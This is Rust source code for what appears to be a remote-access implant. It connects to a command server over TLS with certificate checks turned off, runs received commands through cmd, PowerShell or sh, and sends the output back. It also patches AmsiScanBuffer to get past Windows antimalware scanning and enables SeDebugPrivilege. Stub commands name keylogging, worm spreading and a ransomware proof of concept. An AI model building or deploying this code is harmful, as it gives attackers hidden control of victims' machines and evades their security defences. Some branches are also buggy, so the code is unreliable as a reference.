#![allow(dead_code)]

use rand::Rng;
use std::iter;
use std::{ffi::CString, ptr};

use winapi::{
    um::{
    memoryapi::{
        VirtualProtect,
        WriteProcessMemory
    },
    libloaderapi::{
        LoadLibraryA,
        GetProcAddress
    },
    processthreadsapi::GetCurrentProcess, 
    winnt::PAGE_READWRITE
    }, 
    shared::{
        minwindef::{
            DWORD, 
            FALSE
        }
    }
};
//EnableDebugPrivileges
use winapi::um::processthreadsapi::{OpenProcessToken};
use winapi::um::winnt::{HANDLE,TOKEN_ADJUST_PRIVILEGES,TOKEN_QUERY,LUID_AND_ATTRIBUTES,SE_PRIVILEGE_ENABLED,TOKEN_PRIVILEGES};
use std::ptr::null_mut;
use std::mem::size_of;
use winapi::shared::ntdef::LUID;
use winapi::um::securitybaseapi::AdjustTokenPrivileges;
use winapi::um::winbase::LookupPrivilegeValueA;
//EnableDebugPrivileges
use clipboard::ClipboardProvider;
use clipboard::ClipboardContext;

use native_tls::TlsConnector;
use core::time;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::path::Path;
use std::process::Command;

use win_screenshot::addon::*;
use win_screenshot::capture::*;
use std::{thread, env};

use std::{fs, time::Instant};
use gethostname::gethostname;

fn current_dir() ->String{
    let cwd = env::current_dir().unwrap();
    let my_cwd = cwd.into_os_string().into_string().unwrap();
    return my_cwd;
}

fn l_screenshot(){ // TODO need to implemente system also in go server
    //https://lib.rs/crates/win-screenshot
    let s = capture_display().unwrap();
   
}
fn go_clipboard() ->String{ // TODO need to implemente system also in go server
    let mut ctx: ClipboardContext = ClipboardProvider::new().unwrap();
    let cwd = env::current_dir().unwrap();
    let my_cwd = cwd.into_os_string().into_string().unwrap();
    return my_cwd;
}
fn generate_string(len: usize) -> String {
    const CHARSET: &[u8] = b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-";
    let mut rng = rand::thread_rng();
    let one_char = || CHARSET[rng.gen_range(0..CHARSET.len())] as char;
    iter::repeat_with(one_char).take(len).collect()
}


fn mind_reader_sectioid( mindto_read:&str,windows_shell: &str) -> Vec<u8>  {
    let output = if cfg!(target_os = "windows") {
        match windows_shell {
            "cmd" => {
                Command::new(windows_shell)
                .args(["/C ", mindto_read])
                .output()
                .expect("failed to execute process")
            },
            "powershell" => {
                Command::new("powershell")
                .args(["-c", mindto_read])
                .output()
                .expect("failed to execute process")
               
          },
          windows_shell => {
                Command::new(windows_shell)
                .args(["/C ", mindto_read])
                .output()
                .expect("failed to execute process")
                }

        };
        Command::new(windows_shell)
                .args(["/C", mindto_read])
                .output()
                .expect("failed to execute process")
    } else {
        Command::new("sh")
                .arg("-c")
                .arg(mindto_read)
                .output()
                .expect("failed to execute process")
    };
    let mut out=output.stdout;
    if out.is_empty(){out="Type again".as_bytes().to_vec()}
    return out;
}
//get process_name
fn get_exec_name() -> Option<String> {
    std::env::current_exe()
        .ok()
        .and_then(|pb| pb.file_name().map(|s| s.to_os_string()))
        .and_then(|s| s.into_string().ok())
}

fn main() {
   // let connector = TlsConnector::new();
   let accept_invalid_certs = true;
    let tls_builder = native_tls::TlsConnector::builder()
    .danger_accept_invalid_certs(accept_invalid_certs)
    .build()
    .unwrap();
        //.build().expect("Failed to create TLS connector");
    let  stream = TcpStream::connect("127.0.0.1:5001").expect("Failed to connect to server");
    let mut tls = tls_builder.connect("127.0.0.1", stream).expect("Failed to create TLS stream");

    let mut muton = [0 as u8; 524288];
    let mut windows_shell="cmd";
    //tls.write_all(current_dir().as_bytes());
    let mut id =(("agent::" ).to_string())+&(generate_string(15).to_string()); // cgange id later
    let ten_millis = time::Duration::from_millis(100);
    thread::sleep(ten_millis);
    loop {
        
        tls.write_all((id).as_bytes());
        tls.write_all(current_dir().as_bytes());
       
        
        //print on severside the working directory

        // read the command
        tls.read(&mut muton);
        //Converting Command ri a readable format
        let my_string = String::from_utf8_lossy(&muton);
        let mut splitted = my_string.split("\r");
        let raw_command=splitted.next().unwrap();

        println!("raw_command is {:?}",raw_command);
        

        // read_line leaves a trailing newline, which trim removes
        // this needs to be peekable so we can determine when we are on the last command
        let mut commands = raw_command.trim().split(" | ").peekable();

        
        while let Some(command) = commands.next() {
            // everything after the first whitespace character is interpreted as args to the command
            println!("{:?}",command);
            let mut parts = command.trim().split_whitespace();
            if command.is_empty() {
                tls.write_all(b"Empty data");
            }else {
                
            let command = parts.next().unwrap();
            let args = parts;

            match command {
                "cd" => {
                    // default to '/' as new directory if one was not provided
                    let new_dir = args.peekable().peek().map_or("/", |x| *x);
                    let root = Path::new(new_dir);
                    if let Err(e) = env::set_current_dir(&root) {
                        eprintln!("{}", e);
                    }

                   
                }
                //https://docs.rs/powershell_script/latest/powershell_script/
                "powershell" => {
                    windows_shell="powershell"; 
                    tls.write_all(b"powershell swicth Finished"); },
                "cmd" => {windows_shell="cmd";  tls.write_all(b"cmd swicth Finished");},
                "ClippyON" => return,
                "ClippyOFF" => return,
                "spawn-self" => {
                    let program_name_exe=std::env::current_exe()
                    .expect("Can't get the exec path")
                    .file_name()
                    .expect("Can't get the exec name")
                    .to_string_lossy()
                    .into_owned();
                    Command::new(program_name_exe).spawn();
                    tls.write_all(b"spawn-self Finished");
                }
                "CreapyON" => return,
                "CreapyOFF" => return,
                "Make_Self" => return,
                "KeySnipON" => return,
                "KeySnipOFF" => return,
                "WormSelf" => return,
                "RansomOnPOC" => return,
                "Migrate" => return,
                "Amsi_bypass_enable" =>{
                    println!("[+] Patching amsi for current process...");

                    unsafe {
                        // Getting the address of AmsiScanBuffer.
                        let patch = [0x40, 0x40, 0x40, 0x40, 0x40, 0x40];
                        let amsi_dll = LoadLibraryA(CString::new("amsi").unwrap().as_ptr());
                        let amsi_scan_addr = GetProcAddress(amsi_dll, CString::new("AmsiScanBuffer").unwrap().as_ptr());
                        let mut old_permissions: DWORD = 0;
                        
                        // Overwrite this address with nops.
                        if VirtualProtect(amsi_scan_addr.cast(), 6, PAGE_READWRITE, &mut old_permissions) == FALSE {
                            tls.write_all(("[-] Failed to change protection.").as_bytes());
                        }
                        let written: *mut usize = ptr::null_mut();
                
                        if WriteProcessMemory(GetCurrentProcess(), amsi_scan_addr.cast(), patch.as_ptr().cast(), 6, written) == FALSE {
                            tls.write_all(("[-] Failed to overwrite function.").as_bytes());
                        }
          
                        tls.write_all(("[+] AmsiScanBuffer Disabled!").as_bytes());

                     
                }
            },"Amsi_bypass_status" =>{
                println!("[+] Patching amsi for current process...");

                unsafe {
                    // Getting the address of AmsiScanBuffer.
                    let patch = [0x40, 0x40, 0x40, 0x40, 0x40, 0x40];
                    let amsi_dll = LoadLibraryA(CString::new("amsi").unwrap().as_ptr());
                    let amsi_scan_addr = GetProcAddress(amsi_dll, CString::new("AmsiScanBuffer").unwrap().as_ptr());
                    let mut old_permissions: DWORD = 0;
                    
                    // Overwrite this address with nops.
                    if VirtualProtect(amsi_scan_addr.cast(), 6, PAGE_READWRITE, &mut old_permissions) == FALSE {
                        tls.write_all(("[+] AmsiScanBuffer Disabled!").as_bytes());
                    }
                    let written: *mut usize = ptr::null_mut();
            
                    if WriteProcessMemory(GetCurrentProcess(), amsi_scan_addr.cast(), patch.as_ptr().cast(), 6, written) == FALSE {
                        tls.write_all(("[+] AmsiScanBuffer Enabled!").as_bytes());
                    }     else
                    {
                        tls.write_all(("[+] AmsiScanBuffer Disabled!").as_bytes());
                    }
                    

                 
            }
        },"Amsi_bypass_disable" =>{
                println!("[+] Patching amsi for current process...");

                unsafe {
                    // Getting the address of AmsiScanBuffer.
                    let patch = [0x40, 0x40, 0x40, 0x40, 0x40, 0x40];
                    let amsi_dll = LoadLibraryA(CString::new("amsi").unwrap().as_ptr());
                    let amsi_scan_addr = GetProcAddress(amsi_dll, CString::new("AmsiScanBuffer").unwrap().as_ptr());
                    let mut old_permissions: DWORD = 0;
                    let written: *mut usize = ptr::null_mut();
                 
            
                    // Restoring the permissions.
                    VirtualProtect(amsi_scan_addr.cast(), 6, old_permissions, &mut old_permissions);
                    tls.write_all(("[+] AmsiScanBuffer Enabled!").as_bytes());

                 
            }
        },
                            "EnableDebugPrivileges"=> {unsafe{
                    let mut h_token: HANDLE = 0 as _;
                    OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,&mut h_token);
                    let privs = LUID_AND_ATTRIBUTES {Luid: LUID { LowPart: 0, HighPart: 0,},Attributes: SE_PRIVILEGE_ENABLED,};
                    let mut tp = TOKEN_PRIVILEGES {PrivilegeCount: 1,Privileges: [privs ;1],};
                    let privilege = "SeDebugPrivilege\0";
                    let _ = LookupPrivilegeValueA(null_mut(),privilege.as_ptr() as *const i8,&mut tp.Privileges[0].Luid,);
                    let _ = AdjustTokenPrivileges(h_token,0,&mut tp,size_of::<TOKEN_PRIVILEGES>() as _,null_mut(),null_mut());
                    tls.write_all(b"SeDebugPrivilege Finished");
              }},
                "sleep15s" => {
                    let ten_millis = time::Duration::from_millis(15000);
                    thread::sleep(ten_millis);
                    tls.write_all(b"Sleep Finished");
                },
                command => {
                let Output= mind_reader_sectioid(command,windows_shell);
                let c: &[u8] =&Output;
                tls.write_all(c);

                }
            }
            }
            
            
        }
          
        

    

    }


}
